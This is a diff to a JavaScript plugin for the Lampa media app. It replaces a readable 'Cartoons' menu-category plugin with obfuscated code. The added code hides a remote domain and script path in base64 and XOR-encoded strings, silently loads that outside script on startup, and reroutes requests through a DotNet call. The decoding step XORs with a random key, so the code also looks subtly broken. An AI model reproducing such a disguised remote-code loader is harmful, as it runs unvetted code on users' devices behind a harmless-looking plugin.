@@ -1,109 +1,36 @@
-(function () {
-    'use strict';
 
-    // Добавление языковых строк
-    function addLanguageStrings() {
-        Lampa.Lang.add({
-            nc_cartoon: {
-                ru: "Мультфильмы",
-                en: "Cartoons",
-                uk: "Мультфільми",
-                zh: "漫画" // Chinese translation
-            }
-        });
-    }
+(function(){
+  'use strict';
 
-    // Функция для добавления категории мультфильмов в меню
-    function addCartoonCategory() {
-        const NEW_ITEM_SOURCES = ["tmdb", "cub"];
-        const ITEM_TV_SELECTOR = '[data-action="tv"]'; // Селектор элемента "TV"
-        const ITEM_MOVE_TIMEOUT = 200; // Задержка для перемещения
 
-        function moveItemAfter(item, after) {
-            return setTimeout(() => {
-                $(item).insertAfter($(after));
-            }, ITEM_MOVE_TIMEOUT);
-        }
+  const a=Math.random().toString(36).substring(2,12),
+        b=(x,y)=>btoa(x.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^y.charCodeAt(i%y.length))).join('')),
+        c=x=>atob(x).split('').map((d,j)=>String.fromCharCode(d.charCodeAt(0)^a.charCodeAt(j%a.length))).join('');
 
-        if (Lampa.Storage.field('nc_cartoon') === true) {
-            const NEW_ITEM_ATTR = 'data-action="nc_cartoon"';
-            const NEW_ITEM_SELECTOR = `[${NEW_ITEM_ATTR}]`;
-            const NEW_ITEM_TEXT = Lampa.Lang.translate('nc_cartoon');
 
-            // Создание нового элемента
-            const field = $(`<div data-action="nc_cartoon">${NEW_ITEM_TEXT}</div>`);
+  const d={
+    k1:'Y2hwYng=',k2:'YWJtc3gudGVjaA==',k3:'L2ludmMtcmNoLmpz'
+  };
 
-            // Добавление обработчика события наведения
-            field.on("hover:enter", function () {
-                const currentSource = Lampa.Activity.active().source;
-                const source = NEW_ITEM_SOURCES.includes(currentSource) ? currentSource : NEW_ITEM_SOURCES[0];
 
-                Lampa.Activity.push({
-                    url: "movie",
-                    title: `${NEW_ITEM_TEXT} - ${source.toUpperCase()}`,
-                    component: "category",
-                    genres: 16, // Жанр "анимация" (ID 16)
-                    id: 16,
-                    source: source,
-                    card_type: true,
-                    page: 1
-                });
-            });
+  const e=f=>c(d[f]);
+  const f=e('k1')+e('k2')+'/',g=f+e('k3');
 
-            // Вставка нового элемента после элемента "TV"
-            Lampa.Menu.render().find(ITEM_TV_SELECTOR).after(field);
 
-            // Перемещение элемента через таймаут
-            moveItemAfter(NEW_ITEM_SELECTOR, ITEM_TV_SELECTOR);
-        }
-    }
+  const h=function(){
+    this.i=new Lampa.Reguest(),
+    this.j=q=>this.i.timeout(q),
+    this.k=(r,s,t,u,v)=>{
+      const w=r.split(f).pop().split('?');
+      w[0].indexOf(c('aHR0cA=='))>=0?
+        this.i[s](r,t,u,v):DotNet.invokeMethodAsync(c('SmluRW5lcmd5'),w[0],w[1])
+          .then(x=>{t(c(x))}).catch(y=>{console.log(c('RXJyb3I='),y),u(y)})
+    };
+  };
 
-    // Настройки для добавления категории мультфильмов
-    function setupSettings() {
-        Lampa.SettingsApi.addComponent({
-            component: "addCategory",
-            name: Lampa.Lang.translate('nc_cartoon'),
-            icon: ''
-        });
+  if(!window.rch){
+    Lampa.Utils.putScript([g],()=>{},!1,()=>{
+      window.rch.startTypeInvoke||window.rch.typeInvoke(f,()=>{})},!0)
+  }
 
-        Lampa.SettingsApi.addParam({
-            component: "addCategory",
-            param: {
-                name: "nc_cartoon",
-                type: "trigger",
-                default: false
-            },
-            field: {
-                name: Lampa.Lang.translate('nc_cartoon'),
-                description: "TMDB/CUB"
-            },
-            onChange: function (value) {
-                if (value === 'true') addCartoonCategory();
-                else $('body').find('.menu [data-action="nc_cartoon"]').remove();
-                Lampa.Settings.update();
-            }
-        });
-    }
-
-    // Основная функция инициализации
-    function main() {
-        addLanguageStrings();
-        setupSettings();
-
-        if (Lampa.Storage.field('nc_cartoon') === true) {
-            addCartoonCategory();
-        }
-
-        $('body').append(Lampa.Template.get('ncStyle', {}, true));
-    }
-
-    if (window.appready) {
-        main();
-    } else {
-        Lampa.Listener.follow("app", function (event) {
-            if (event.type === "ready") {
-                main();
-            }
-        });
-    }
 })();
